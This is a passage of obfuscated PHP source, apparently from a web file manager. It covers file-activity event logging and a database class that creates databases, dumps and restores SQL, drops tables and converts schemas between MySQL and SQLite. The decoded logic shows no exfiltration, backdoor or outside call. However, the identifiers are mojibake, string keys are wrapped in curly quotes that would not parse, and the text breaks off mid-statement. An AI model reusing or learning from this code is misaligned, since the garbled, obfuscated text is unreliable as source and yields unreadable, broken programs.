$»±¹Ñ¶ =& $_SERVER[‘ÆÜ‘œ]; $äæ“£ = Model($»±¹Ñ¶[1484])->sourceInfo($ÔãÀ¼ıƒ); $†Ñæ×¡ì = array($»±¹Ñ¶[2368] => $Ùä½¢¼, $»±¹Ñ¶[32] => $äæ“£[$»±¹Ñ¶[32]]); return $this->addEvent($ÔãÀ¼ıƒ, $»±¹Ñ¶[2367], $†Ñæ×¡ì); } public function eventFileEdit($ª¦åÑÆ) { $şÊíÙÛÅ =& $_SERVER[‘ÆÜ‘œ]; $Š÷Š€É = array($şÊíÙÛÅ[2374] => $_SERVER[$şÊíÙÛÅ[2375]], $şÊíÙÛÅ[2376] => strtolower(ACTION)); if (isset($GLOBALS[$şÊíÙÛÅ[7]][$şÊíÙÛÅ[1574]])) { $Š÷Š€É[$şÊíÙÛÅ[1574]] = $şÊíÙÛÅ[91]; } return $this->addEvent($ª¦åÑÆ, $şÊíÙÛÅ[1513], $Š÷Š€É); } public function eventRecycle($†©—ßöÈ, $¥İäõÚÖ) { return $this->addEvent($†©—ßöÈ, $_SERVER[‘ÆÜ‘œ][2369], $¥İäõÚÖ); } private static $_removeLast = ''; public function eventRemove($ ãèˆøë) { $°¨•üş =& $_SERVER[‘ÆÜ‘œ]; self::$_removeLast = $ ãèˆøë; $ Äóİáş = Model($°¨•üş[1484])->sourceInfo($ ãèˆøë); $‚™œİª¨ = array_field_key($ Äóİáş, array($°¨•üş[192], $°¨•üş[565], $°¨•üş[528], $°¨•üş[612])); $ğÁ¡÷ü = array($°¨•üş[169] => $ Äóİáş[$°¨•üş[32]], $°¨•üş[2376] => ACTION, $°¨•üş[2377] => $‚™œİª¨); return $this->addEvent($ Äóİáş[$°¨•üş[191]], $°¨•üş[1282], $ğÁ¡÷ü); } public function eventShare($Êìîò¢å, $½’¼ˆèÚ) { return $this->addEvent($Êìîò¢å, $_SERVER[‘ÆÜ‘œ][1514], $½’¼ˆèÚ); } public function eventMove($éø“È‡š, $¦˜¬ú„ç, $¹õÊª¿·) { $ÜË³ºâÕ =& $_SERVER[‘ÆÜ‘œ]; if (self::$_removeLast == $éø“È‡š) { return; } $´®ĞÃ¨Õ = Model($ÜË³ºâÕ[1484]); $½üÌ…ü = $´®ĞÃ¨Õ->sourceInfo($éø“È‡š); $±„ùÒ¡‘ = $´®ĞÃ¨Õ->sourceInfo($¦˜¬ú„ç); $Ší¢ñ°ë = $´®ĞÃ¨Õ->sourceInfo($¹õÊª¿·); $ÛÒŠüÖ‹ = array($ÜË³ºâÕ[1294] => $¦˜¬ú„ç, $ÜË³ºâÕ[2378] => $±„ùÒ¡‘[$ÜË³ºâÕ[32]], $ÜË³ºâÕ[2336] => !empty($±„ùÒ¡‘[$ÜË³ºâÕ[610]]) ? $±„ùÒ¡‘[$ÜË³ºâÕ[610]] : $ÜË³ºâÕ[12], $ÜË³ºâÕ[1295] => $¹õÊª¿·, $ÜË³ºâÕ[2379] => $Ší¢ñ°ë[$ÜË³ºâÕ[32]], $ÜË³ºâÕ[2380] => !empty($Ší¢ñ°ë[$ÜË³ºâÕ[610]]) ? $Ší¢ñ°ë[$ÜË³ºâÕ[610]] : $ÜË³ºâÕ[12]); $this->addEvent($éø“È‡š, $ÜË³ºâÕ[651], $ÛÒŠüÖ‹); $½üÌ…ü = $´®ĞÃ¨Õ->sourceInfo($éø“È‡š); $ÛÒŠüÖ‹ = array($ÜË³ºâÕ[192] => $½üÌ…ü[$ÜË³ºâÕ[192]], $ÜË³ºâÕ[32] => $½üÌ…ü[$ÜË³ºâÕ[32]]); $this->addEvent($¦˜¬ú„ç, $ÜË³ºâÕ[2381], $ÛÒŠüÖ‹); } public function eventCopy($åÊİúÈò) { $this->eventCreate($åÊİúÈò, $_SERVER[‘ÆÜ‘œ][649]); } public function eventRename($¾è¥×Ùğ, $ŸŠ×ˆ„’, $¾±Õ¬) { $ôÜ¤ü =& $_SERVER[‘ÆÜ‘œ]; $¬™ŸäÂ = array($ôÜ¤ü[1294] => $ŸŠ×ˆ„’, $ôÜ¤ü[1295] => $¾±Õ¬); return $this->addEvent($¾è¥×Ùğ, $ôÜ¤ü[1498], $¬™ŸäÂ); } public function eventAddComment($¨ Êõä‰, $ˆÃî­½) { return $this->addEvent($¨ Êõä‰, $_SERVER[‘ÆÜ‘œ][2382], $ˆÃî­½); } public function eventAddDesc($×áÔöô¨, $í»ñÙÁ) { return $this->addEvent($×áÔöô¨, $_SERVER[‘ÆÜ‘œ][2383], $í»ñÙÁ); } public function listBySource($§€ŞÇ–) { $ƒªˆßÇ¼ =& $_SERVER[‘ÆÜ‘œ]; $öĞÍ§— = Model($ƒªˆßÇ¼[1484])->sourceInfo($§€ŞÇ–); $’Ñ¨Â…À = array($ƒªˆßÇ¼[514] => $§€ŞÇ–); if ($öĞÍ§—[$ƒªˆßÇ¼[508]] == $ƒªˆßÇ¼[91]) { $¾£¼Îó = Model($ƒªˆßÇ¼[1484])->listSearchChildren($§€ŞÇ–, 20000); $¾£¼Îó[] = $§€ŞÇ– . $ƒªˆßÇ¼[472]; $’Ñ¨Â…À = array($ƒªˆßÇ¼[192] => array($ƒªˆßÇ¼[7], $¾£¼Îó)); } $£âÆïäú = $this->where($’Ñ¨Â…À)->order($ƒªˆßÇ¼[2384])->selectPage(); if ($£âÆïäú[$ƒªˆßÇ¼[452]][$ƒªˆßÇ¼[453]] == 0) { $£âÆïäú[$ƒªˆßÇ¼[452]][$ƒªˆßÇ¼[453]] = 1; $£âÆïäú[$ƒªˆßÇ¼[455]] = array(array($ƒªˆßÇ¼[514] => $§€ŞÇ–, $ƒªˆßÇ¼[2365] => $öĞÍ§—[$ƒªˆßÇ¼[191]], $ƒªˆßÇ¼[1921] => $öĞÍ§—[$ƒªˆßÇ¼[549]], $ƒªˆßÇ¼[519] => $ƒªˆßÇ¼[2385], $ƒªˆßÇ¼[520] => $öĞÍ§—[$ƒªˆßÇ¼[232]], $ƒªˆßÇ¼[1923] => $ƒªˆßÇ¼[12])); } return $this->eventListParse($£âÆïäú, $§€ŞÇ–); } private function eventListParse($…Ñ”«É°, $¢øÁÒ¶‚) { $®İ¤´ÖÏ =& $_SERVER[‘ÆÜ‘œ]; $Ğ‚£¶— = $…Ñ”«É°[$®İ¤´ÖÏ[455]]; $Ì§ï¿¤ = array_to_keyvalue($Ğ‚£¶—, $®İ¤´ÖÏ[12], $®İ¤´ÖÏ[192]); $ÓÑûÓ±À = array_to_keyvalue($Ğ‚£¶—, $®İ¤´ÖÏ[12], $®İ¤´ÖÏ[2371]); foreach ($Ğ‚£¶— as $¤„µ­Öæ) { $ëìêÑş† = $¤„µ­Öæ[$®İ¤´ÖÏ[548]]; if ($¤„µ­Öæ[$®İ¤´ÖÏ[33]] == $®İ¤´ÖÏ[651] && isset($ëìêÑş†[$®İ¤´ÖÏ[1294]])) { $Ì§ï¿¤[] = $ëìêÑş†[$®İ¤´ÖÏ[1294]] . $®İ¤´ÖÏ[12]; $Ì§ï¿¤[] = $ëìêÑş†[$®İ¤´ÖÏ[1295]] . $®İ¤´ÖÏ[12]; } if ($¤„µ­Öæ[$®İ¤´ÖÏ[33]] == $®İ¤´ÖÏ[2381] && isset($ëìêÑş†[$®İ¤´ÖÏ[192]])) { $Ì§ï¿¤[] = $ëìêÑş†[$®İ¤´ÖÏ[192]] . $®İ¤´ÖÏ[12]; } } $Ì§ï¿¤ = array_merge($Ì§ï¿¤, $ÓÑûÓ±À, array($¢øÁÒ¶‚ . $®İ¤´ÖÏ[12])); $Ì§ï¿¤ = array_unique($Ì§ï¿¤); $ ŸÒ¥é = array_unique(array_to_keyvalue($Ğ‚£¶—, $®İ¤´ÖÏ[12], $®İ¤´ÖÏ[1544])); $÷ŠÊÏÖ = Model($®İ¤´ÖÏ[625])->userListInfo($ ŸÒ¥é); $»¸ö¦Ş¨ = Model($®İ¤´ÖÏ[939])->sourceListInfo($Ì§ï¿¤, !0); foreach ($Ğ‚£¶— as &$¤„µ­Öæ) { if ($¤„µ­Öæ[$®İ¤´ÖÏ[33]] == $®İ¤´ÖÏ[651] && isset($¤„µ­Öæ[$®İ¤´ÖÏ[548]][$®İ¤´ÖÏ[1294]])) { $¤„µ­Öæ[$®İ¤´ÖÏ[548]][$®İ¤´ÖÏ[1294]] = $»¸ö¦Ş¨[$¤„µ­Öæ[$®İ¤´ÖÏ[548]][$®İ¤´ÖÏ[1294]]]; $¤„µ­Öæ[$®İ¤´ÖÏ[548]][$®İ¤´ÖÏ[1295]] = $»¸ö¦Ş¨[$¤„µ­Öæ[$®İ¤´ÖÏ[548]][$®İ¤´ÖÏ[1295]]]; } if ($¤„µ­Öæ[$®İ¤´ÖÏ[33]] == $®İ¤´ÖÏ[2381] && isset($¤„µ­Öæ[$®İ¤´ÖÏ[548]][$®İ¤´ÖÏ[192]])) { $¤„µ­Öæ[$®İ¤´ÖÏ[548]][$®İ¤´ÖÏ[192]] = $»¸ö¦Ş¨[$¤„µ­Öæ[$®İ¤´ÖÏ[548]][$®İ¤´ÖÏ[192]]]; } $¤„µ­Öæ[$®İ¤´ÖÏ[90]] = $»¸ö¦Ş¨[$¤„µ­Öæ[$®İ¤´ÖÏ[192]]]; $¤„µ­Öæ[$®İ¤´ÖÏ[2386]] = $»¸ö¦Ş¨[$¤„µ­Öæ[$®İ¤´ÖÏ[2371]]]; if ($¤„µ­Öæ[$®İ¤´ÖÏ[33]] == $®İ¤´ÖÏ[1282]) { $¤„µ­Öæ[$®İ¤´ÖÏ[2386]] = $¤„µ­Öæ[$®İ¤´ÖÏ[90]]; $¤„µ­Öæ[$®İ¤´ÖÏ[2371]] = $¤„µ­Öæ[$®İ¤´ÖÏ[2386]][$®İ¤´ÖÏ[192]]; $¤„µ­Öæ[$®İ¤´ÖÏ[90]] = !1; $¤„µ­Öæ[$®İ¤´ÖÏ[192]] = $®İ¤´ÖÏ[12]; } $¤„µ­Öæ[$®İ¤´ÖÏ[2310]] = $÷ŠÊÏÖ[$¤„µ­Öæ[$®İ¤´ÖÏ[1544]]]; } unset($¤„µ­Öæ); $…Ñ”«É°[$®İ¤´ÖÏ[455]] = $Ğ‚£¶—; return $…Ñ”«É°; } public function removeBySource($ıïÜÕˆ) { $ùòÇ¬ï = array($_SERVER[‘ÆÜ‘œ][514] => $ıïÜÕˆ); $this->where($ùòÇ¬ï)->remove(); } } goto b×´Ëó–à×; AÆØŠíŞŞÏ: class DbManage { function __construct($çá€ÙÔ = array()) { $åà Ò÷à =& $_SERVER[‘ÆÜ‘œ]; if (empty($çá€ÙÔ)) { $çá€ÙÔ = $GLOBALS[$åà Ò÷à[6]][$åà Ò÷à[21]]; } $this->database = $çá€ÙÔ; } public function model($ˆ£¬Ã = '') { return new ModelBase($ˆ£¬Ã, $_SERVER[‘ÆÜ‘œ][12], $this->database); } public function db($ğ¢¾¨Îû = false) { $ÃıĞ¶¯İ =& $_SERVER[‘ÆÜ‘œ]; $Òß¹½Áù = array_change_key_case($this->database); if ($this->dbType() == $ÃıĞ¶¯İ[13] || !$ğ¢¾¨Îû) { return $this->model()->db(); } $¢¥êŞê = $Òß¹½Áù[$ÃıĞ¶¯İ[1090]]; $Òß¹½Áù[$ÃıĞ¶¯İ[1090]] = $ÃıĞ¶¯İ[12]; if ($Òß¹½Áù[$ÃıĞ¶¯İ[1085]] == $ÃıĞ¶¯İ[1082]) { $²ßšÈ“Ÿ = $Òß¹½Áù[$ÃıĞ¶¯İ[1091]]; $Òß¹½Áù[$ÃıĞ¶¯İ[1091]] = substr($²ßšÈ“Ÿ, 0, strrpos($²ßšÈ“Ÿ, $ÃıĞ¶¯İ[1177])); } $this->database = $Òß¹½Áù; $ÌÈíÚ = $this->model()->db(); try { $æ×Â‘òå = $ÌÈíÚ->execute("\x73\x68\x6f\167\x20\x64\x61\x74\x61\x62\141\x73\x65\163\x20\154\151\153\x65\40\47{$¢¥êŞê}\x27"); } catch (Exception $ûüê‚ƒ) { } if (!$æ×Â‘òå) { $ÌÈíÚ->execute("\x63\162\145\x61\164\145\40\144\x61\164\141\142\141\x73\145\40\140{$¢¥êŞê}\x60"); } $Òß¹½Áù[$ÃıĞ¶¯İ[1090]] = $¢¥êŞê; if ($Òß¹½Áù[$ÃıĞ¶¯İ[1085]] == $ÃıĞ¶¯İ[1082]) { $Òß¹½Áù[$ÃıĞ¶¯İ[1091]] .= $ÃıĞ¶¯İ[1177] . $¢¥êŞê; } $this->database = $Òß¹½Áù; $ÌÈíÚ->execute("\165\x73\x65\x20\x60{$¢¥êŞê}\140"); return $ÌÈíÚ; } public function createTable($ğÆ‡­ğÉ, &$„Ò´ÉÜ) { $€ì®³“ =& $_SERVER[‘ÆÜ‘œ]; if (!IO::exist($ğÆ‡­ğÉ)) { show_json(LNG($€ì®³“[1178]), !1); } $¾©Úš¯ = $this->model()->db(); $¯ş‘¡Œ = sqlSplit(IO::getContent($ğÆ‡­ğÉ)); foreach ($¯ş‘¡Œ as $Û£–Ê£İ) { $Ğ©Ø“ùÁ = stripos($Û£–Ê£İ, $€ì®³“[1179]) === 0; if ($Ğ©Ø“ùÁ) { $„Ò´ÉÜ->task[$€ì®³“[1180]] += 1; } $¾©Úš¯->execute($Û£–Ê£İ); if ($Ğ©Ø“ùÁ) { preg_match($€ì®³“[1181], $Û£–Ê£İ, $Å›ö°»à); $„Ò´ÉÜ->task[$€ì®³“[1182]] = $Å›ö°»à[1]; $„Ò´ÉÜ->update(1); } } } public function insertTable($¦ŸŒ«¡„, &$°ê“·¹é) { $²„ı¥ç£ =& $_SERVER[‘ÆÜ‘œ]; $€ñØç = $this->model()->db(); $”ÏÉÈ”® = $°¼îÊªª ? array($°¼îÊªª) : $€ñØç->getTables(); foreach ($¦ŸŒ«¡„ as $Á’û©š³) { $°¼îÊªª = basename($Á’û©š³, $²„ı¥ç£[899]); if (!in_array($°¼îÊªª, $”ÏÉÈ”®)) { continue; } $°ê“·¹é->task[$²„ı¥ç£[1182]] = $°¼îÊªª; if ($°¼îÊªª == $²„ı¥ç£[481]) { continue; } if (get_filesize($Á’û©š³) == 0) { continue; } $«¤§äÆ« = $this->sqlToDb($Á’û©š³, $°ê“·¹é); if (!$«¤§äÆ«) { show_json(LNG($²„ı¥ç£[1183]) . "\133{$°¼îÊªª}\x5d", !1); } } } public function sqlFromDb($ØæÊ®à, $ŠÎ¿¬¦, &$­«×ì˜“, $àÜ—ÑÕ = '') { if ($­«×ì˜“) { $­«×ì˜“->task[$_SERVER[‘ÆÜ‘œ][1182]] = $ØæÊ®à; } $Š±Ç¸“À = $this->model($ØæÊ®à); $É­¾ƒ®£ = 0; $‹òé§Êô = 0; $ßÜ§ïá = 10000; $âòàã–ô = fopen($ŠÎ¿¬¦, $_SERVER[‘ÆÜ‘œ][1184]); $³¥ÙÂîİ = $Š±Ç¸“À->getPk(); $ÁÇË§¨ = $Š±Ç¸“À->getDbFields(); $Š²çÖû = $_SERVER[‘ÆÜ‘œ][12]; if ($GLOBALS[$_SERVER[‘ÆÜ‘œ][898]] && in_array($ØæÊ®à, array($_SERVER[‘ÆÜ‘œ][1185], $_SERVER[‘ÆÜ‘œ][1186]))) { $Š²çÖû = $ØæÊ®à; } do { $´²ÁƒÁ = array($³¥ÙÂîİ => array($_SERVER[‘ÆÜ‘œ][1132], $‹òé§Êô)); $ıÂï¾ĞÈ = $Š±Ç¸“À->where($´²ÁƒÁ)->field($ÁÇË§¨)->order($³¥ÙÂîİ . $_SERVER[‘ÆÜ‘œ][1187])->limit($ßÜ§ïá)->select(); $ıÂï¾ĞÈ = !empty($ıÂï¾ĞÈ) ? $ıÂï¾ĞÈ : array(); if (!($ì ëÜòë = count($ıÂï¾ĞÈ))) { break; } $²›šò£¶ = end($ıÂï¾ĞÈ); $‹òé§Êô = $²›šò£¶[$³¥ÙÂîİ]; $Ì®’û•’ = array(); foreach ($ıÂï¾ĞÈ as $€îÈğÍ‘) { if ($Š²çÖû) { if ($ØæÊ®à == $_SERVER[‘ÆÜ‘œ][1185]) { if ($€îÈğÍ‘[$_SERVER[‘ÆÜ‘œ][33]] == $_SERVER[‘ÆÜ‘œ][1188]) { $™²íö©à = json_decode($€îÈğÍ‘[$_SERVER[‘ÆÜ‘œ][460]], !0); if ($™²íö©à[$_SERVER[‘ÆÜ‘œ][32]] == $GLOBALS[$_SERVER[‘ÆÜ‘œ][898]] && $™²íö©à[$_SERVER[‘ÆÜ‘œ][857]] != 1) { continue; } } } else { if ($€îÈğÍ‘[$_SERVER[‘ÆÜ‘œ][33]] == $_SERVER[‘ÆÜ‘œ][1189] && $€îÈğÍ‘[$_SERVER[‘ÆÜ‘œ][95]] == $_SERVER[‘ÆÜ‘œ][894]) { continue; } } } if ($àÜ—ÑÕ) { $€îÈğÍ‘[$_SERVER[‘ÆÜ‘œ][87]] = "\173\x69\157\72{$àÜ—ÑÕ}\x7d" . substr($€îÈğÍ‘[$_SERVER[‘ÆÜ‘œ][87]], strlen("\x7b\151\x6f\72{$€îÈğÍ‘[$_SERVER[‘ÆÜ‘œ][932]]}\x7d")); $€îÈğÍ‘[$_SERVER[‘ÆÜ‘œ][932]] = $àÜ—ÑÕ; } $Ì®’û•’[] = $_SERVER[‘ÆÜ‘œ][1190] . $this->sqlEncode($€îÈğÍ‘) . $_SERVER[‘ÆÜ‘œ][1191]; } $È„Ÿ«à„ = "\x49\116\123\105\122\x54\x20\111\x4e\x54\117\40\140{$ØæÊ®à}\x60\x20\x28\x60" . implode($_SERVER[‘ÆÜ‘œ][1192], $ÁÇË§¨) . $_SERVER[‘ÆÜ‘œ][1193]; fwrite($âòàã–ô, $È„Ÿ«à„ . implode($_SERVER[‘ÆÜ‘œ][1194], $Ì®’û•’) . $_SERVER[‘ÆÜ‘œ][74] . PHP_EOL); $É­¾ƒ®£ += $ì ëÜòë; if ($­«×ì˜“) { $­«×ì˜“->update($ì ëÜòë); } } while ($ßÜ§ïá == $ì ëÜòë); fclose($âòàã–ô); return $É­¾ƒ®£; } public function sqlToDb($ı¦›–™ò, &$—ˆÔ˜Å·) { $Ìû©ÒŸÉ =& $_SERVER[‘ÆÜ‘œ]; $Üç“Í©– = $this->model()->db(); $ŸÒØƒŒ = @fopen($ı¦›–™ò, $Ìû©ÒŸÉ[1195]); if (!$ŸÒØƒŒ) { return !1; } $ß‡¢¼àÀ = 0; $ÑÅè·è³ = $Ìû©ÒŸÉ[12]; $¹ÖŠ±ñŠ = array(); $ĞĞœîı¨ = $this->dbType(); $›¨øãşÄ = $ĞĞœîı¨ == $Ìû©ÒŸÉ[13] ? 500 : 2000; $Œºà…á¨ = basename($ı¦›–™ò, $Ìû©ÒŸÉ[899]); $Åàâ—õ = 0; $ÌÒÓÅ« = 4194304; while (!feof($ŸÒØƒŒ)) { $‹Äç‘ä = trim(fgets($ŸÒØƒŒ)); if (!$‹Äç‘ä) { continue; } $Ñ÷àìí = $this->sqlDecode($‹Äç‘ä, $ĞĞœîı¨, $Œºà…á¨); if (stripos($Ñ÷àìí, $Ìû©ÒŸÉ[440]) === 0) { if (!$ÑÅè·è³) { $ÑÅè·è³ = $Ñ÷àìí . $Ìû©ÒŸÉ[53]; } continue; } if ($—ˆÔ˜Å·) { $—ˆÔ˜Å·->task[$Ìû©ÒŸÉ[1180]] += 1; } $ß‡¢¼àÀ++; $¹ÖŠ±ñŠ[] = rtrim(rtrim(trim($Ñ÷àìí), $Ìû©ÒŸÉ[50]), $Ìû©ÒŸÉ[74]); $ÕÄª¶ò¹ = null; $ç€ÔşûÎ = strlen($Ñ÷àìí); $Åàâ—õ += $ç€ÔşûÎ; $Òí¼ÁÜ = strlen($ÑÅè·è³) + $Åàâ—õ + (count($¹ÖŠ±ñŠ) - 1); if ($Òí¼ÁÜ >= $ÌÒÓÅ«) { $ÕÄª¶ò¹ = array_pop($¹ÖŠ±ñŠ); if ($ß‡¢¼àÀ > 1) { $ß‡¢¼àÀ--; } } if ($ß‡¢¼àÀ >= $›¨øãşÄ || $ÕÄª¶ò¹) { $Ñ÷àìí = $ÑÅè·è³ . implode($Ìû©ÒŸÉ[50], $¹ÖŠ±ñŠ); if (!$Üç“Í©–->execute($Ñ÷àìí)) { return !1; } if ($—ˆÔ˜Å·) { $—ˆÔ˜Å·->update($ß‡¢¼àÀ); } $¹ÖŠ±ñŠ = array(); $ß‡¢¼àÀ = 0; $Åàâ—õ = 0; if ($ÕÄª¶ò¹) { $¹ÖŠ±ñŠ = array($ÕÄª¶ò¹); $ß‡¢¼àÀ = 1; $Åàâ—õ = $ç€ÔşûÎ; } } } fclose($ŸÒØƒŒ); if (!empty($¹ÖŠ±ñŠ)) { $Ñ÷àìí = $ÑÅè·è³ . implode($Ìû©ÒŸÉ[50], $¹ÖŠ±ñŠ); if (!$Üç“Í©–->execute($Ñ÷àìí)) { return !1; } if ($—ˆÔ˜Å·) { $—ˆÔ˜Å·->update($ß‡¢¼àÀ); } } return !0; } public function dropTable($Êæî³°´ = null) { $šÇìğø¬ =& $_SERVER[‘ÆÜ‘œ]; $¥Ú±õ’« = $this->model()->db(); $»ç¨Œƒü = $Êæî³°´ ? array($Êæî³°´) : $¥Ú±õ’«->getTables(); if (!$»ç¨Œƒü) { return; } foreach ($»ç¨Œƒü as $Êæî³°´) { if ($Êæî³°´) { $Êæî³°´ = strtolower($Êæî³°´); } else { continue; } $¥Ú±õ’«->execute($šÇìğø¬[1196] . $this->escapeName($Êæî³°´) . $šÇìğø¬[1197]); } } private function sqlEncode($„Âåôç) { $±¿ÑŠ’Æ =& $_SERVER[‘ÆÜ‘œ]; $ø©³×è = array(); foreach ($„Âåôç as $ıˆ‘ñÀë) { if (is_array($ıˆ‘ñÀë)) { $ıˆ‘ñÀë = json_encode_force($ıˆ‘ñÀë); } $ıˆ‘ñÀë = addslashes($ıˆ‘ñÀë); $ıˆ‘ñÀë = str_replace(array($±¿ÑŠ’Æ[1198], $±¿ÑŠ’Æ[286], $±¿ÑŠ’Æ[427]), array($±¿ÑŠ’Æ[1199], $±¿ÑŠ’Æ[1200], $±¿ÑŠ’Æ[1201]), $ıˆ‘ñÀë); $ø©³×è[] = $ıˆ‘ñÀë; } return $±¿ÑŠ’Æ[58] . implode($±¿ÑŠ’Æ[1202], $ø©³×è) . $±¿ÑŠ’Æ[58]; } private function sqlDecode($¨Œ¿Ûêô, $Ä£íÊà, $ØŒÜ×ğ = '') { $°—Õ³êù =& $_SERVER[‘ÆÜ‘œ]; $¨Œ¿Ûêô = str_replace(array($°—Õ³êù[1199], $°—Õ³êù[1200], $°—Õ³êù[1201]), array($°—Õ³êù[1198], $°—Õ³êù[286], $°—Õ³êù[427]), $¨Œ¿Ûêô); if ($Ä£íÊà == $°—Õ³êù[13]) { $¨Œ¿Ûêô = str_ireplace($°—Õ³êù[1203], $°—Õ³êù[59], $¨Œ¿Ûêô); $¨Œ¿Ûêô = stripslashes($¨Œ¿Ûêô); } return preg_replace($°—Õ³êù[1204], $°—Õ³êù[12], $¨Œ¿Ûêô); if ($Ä£íÊà == $°—Õ³êù[13]) { return $ØŒÜ×ğ != $°—Õ³êù[481] ? stripslashes($¨Œ¿Ûêô) : $¨Œ¿Ûêô; } if ($ØŒÜ×ğ == $°—Õ³êù[481]) { $¨Œ¿Ûêô = str_replace($°—Õ³êù[1205], $°—Õ³êù[119], stripslashes($¨Œ¿Ûêô)); } return $¨Œ¿Ûêô; } public function getSqlFile($øß×ù‘Ğ = '') { $ƒòõìƒá =& $_SERVER[‘ÆÜ‘œ]; $ì‘»óÈ = $this->dbType(!0); $Ã‘Û‰ã× = CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\154\57\x64\141\x74\141\x2f{$ì‘»óÈ}\56\x73\x71\x6c"; if (!file_exists($Ã‘Û‰ã×)) { return !1; } $êÍ°§Æú = file_get_contents($Ã‘Û‰ã×); $¡ÇÆëã = $ƒòõìƒá[1206] . ($ì‘»óÈ == $ƒòõìƒá[910] ? $ƒòõìƒá[1207] : $ƒòõìƒá[1208]) . $ƒòõìƒá[1209]; preg_match_all($¡ÇÆëã, $êÍ°§Æú, $÷ñÖÉà); $úš¹ğÀµ = $÷ñÖÉà[1]; $´È¢§½¿ = $this->model()->db(); $ëŒ‰çÆÕ = $´È¢§½¿->getTables(); $‘ğÈäÛ = TEMP_FILES . $ƒòõìƒá[1210] . date($ƒòõìƒá[260]) . $ƒòõìƒá[8]; del_dir($‘ğÈäÛ); mk_dir($‘ğÈäÛ); $¼™Ÿò¦ = $‘ğÈäÛ . $ƒòõìƒá[1211]; $Òœûè×… = $‘ğÈäÛ . $ƒòõìƒá[1212]; $§“¦Ü¨´ = $ì‘»óÈ == $ƒòõìƒá[13] ? $ƒòõìƒá[910] : $ƒòõìƒá[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\x74\141\154\154\x2f\x64\x61\164\x61\57{$§“¦Ü¨´}\56\x73\x71\154", $‘ğÈäÛ); @touch($‘ğÈäÛ . $ì‘»óÈ . $ƒòõìƒá[899]); $¢®ş• = fopen($¼™Ÿò¦, $ƒòõìƒá[1184]); $ûÎ¢ñÑİ = fopen($Òœûè×…, $ƒòõìƒá[1184]); if ($ì‘»óÈ == $ƒòõìƒá[13]) { $ëŒ‰çÆÕ = array_diff($ëŒ‰çÆÕ, array($ƒòõìƒá[892], $ƒòõìƒá[893])); $ï‰şµã  = array($ƒòõìƒá[1213], $ƒòõìƒá[1214], $ƒòõìƒá[1215]); fwrite($ûÎ¢ñÑİ, implode(PHP_EOL, $ï‰şµã ) . PHP_EOL . PHP_EOL); foreach ($ëŒ‰çÆÕ as $¨Àúö©÷) { $›¶Ë²ìµ = $this->sqlFromSqlite($¨Àúö©÷); if (!$›¶Ë²ìµ[$ƒòõìƒá[13]]) { continue; } fwrite($ûÎ¢ñÑİ, $›¶Ë²ìµ[$ƒòõìƒá[13]] . PHP_EOL . PHP_EOL); if (!in_array($¨Àúö©÷, $úš¹ğÀµ)) { fwrite($¢®ş•, $›¶Ë²ìµ[$ƒòõìƒá[910]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ëŒ‰çÆÕ as $¨Àúö©÷) { $›¶Ë²ìµ = $this->sqlFromMysql($¨Àúö©÷); if (!$›¶Ë²ìµ[$ƒòõìƒá[910]]) { continue; } fwrite($¢®ş•, $›¶Ë²ìµ[$ƒòõìƒá[910]] . PHP_EOL . PHP_EOL); if (!in_array($¨Àúö©÷, $úš¹ğÀµ)) { fwrite($ûÎ¢ñÑİ, $›¶Ë²ìµ[$ƒòõìƒá[13]] . PHP_EOL . PHP_EOL); } } } fclose($¢®ş•); fclose($ûÎ¢ñÑİ); $êÍ°§Æú = array($ƒòõìƒá[910] => $¼™Ÿò¦, $ƒòõìƒá[13] => $Òœûè×…); return $øß×ù‘Ğ ? $êÍ°§Æú[$øß×ù‘Ğ] : $êÍ°§Æú; } public function dbType($™ˆ«¶Û = false) { $ä ’ùÜ´ =& $_SERVER[‘ÆÜ‘œ]; $¨œöæÓò = $™ˆ«¶Û ? $GLOBALS[$ä ’ùÜ´[6]][$ä ’ùÜ´[21]] : $this->database; $¨œöæÓò = array_change_key_case($¨œöæÓò); $²§êÒ‡™ = $¨œöæÓò[$ä ’ùÜ´[1085]]; if ($²§êÒ‡™ == $ä ’ùÜ´[1082]) { $ ÒœÌÇ = explode($ä ’ùÜ´[4], $¨œöæÓò[$ä ’ùÜ´[1091]]); $²§êÒ‡™ = $ ÒœÌÇ[0]; } $Ò¥š¾ÌÖ = array($ä ’ùÜ´[1216] => $ä ’ùÜ´[13], $ä ’ùÜ´[1030] => $ä ’ùÜ´[910]); if (isset($Ò¥š¾ÌÖ[$²§êÒ‡™])) { $²§êÒ‡™ = $Ò¥š¾ÌÖ[$²§êÒ‡™]; } return $²§êÒ‡™; } public function sqlFromMysql($„ŸÕåÕ™, $˜µ¬’†Ò = '') { $Š—¼€½ë =& $_SERVER[‘ÆÜ‘œ]; $Â™ÅÇ…Ô = array($Š—¼€½ë[910] => $Š—¼€½ë[12], $Š—¼€½ë[13] => $Š—¼€½ë[12]); $ÖÇ²÷˜ = $this->escapeName($„ŸÕåÕ™); $üÄ­ÒŸÇ = $this->escapeName($„ŸÕåÕ™, $Š—¼€½ë[13]); $¬Ç„Ş× = $this->model()->db(); $ë•áÇÀç = $¬Ç„Ş×->query("\163\x68\x6f\167\40\143\x72\x65\141\164\145\40\x74\141\142\154\145\40{$ÖÇ²÷˜}\73"); if (!$ë•áÇÀç || !$ë•áÇÀç[0]) { return !1; } $É­ÃÕä® = _get($ë•áÇÀç[0], $Š—¼€½ë[1217], $Š—¼€½ë[12]); if (!$É­ÃÕä®) { return !1; } $–Ø‹›ôí = "\x44\122\x4f\120\x20\124\101\102\x4c\105\40\x49\x46\x20\x45\130\x49\x53\x54\123\x20{$ÖÇ²÷˜}\73" . PHP_EOL . $É­ÃÕä® . $Š—¼€½ë[74]; if ($˜µ¬’†Ò == $Š—¼€½ë[910]) { return $–Ø‹›ôí; } $Â™ÅÇ…Ô[$Š—¼€½ë[910]] = $–Ø‹›ôí; $±æ›«ë¤ = array_change_key_case($GLOBALS[$Š—¼€½ë[6]][$Š—¼€½ë[21]]); $ûç¥Ã£ã = $±æ›«ë¤[$Š—¼€½ë[1090]]; $Ó¢¥ˆãÂ = $Š—¼€½ë[1218] . $ûç¥Ã£ã . "\47\40\101\x4e\104\40\x54\101\102\x4c\x45\x5f\116\101\115\105\x20\75\40{$üÄ­ÒŸÇ}\x3b"; $íâş¤éé = "\123\110\117\x57\x20\111\x4e\104\x45\x58\40\x46\x52\117\115\40{$ÖÇ²÷˜}\x3b"; $‘­ÀÁŞÓ = $¬Ç„Ş×->query($Ó¢¥ˆãÂ); if (empty($‘­ÀÁŞÓ)) { return $˜µ¬’†Ò 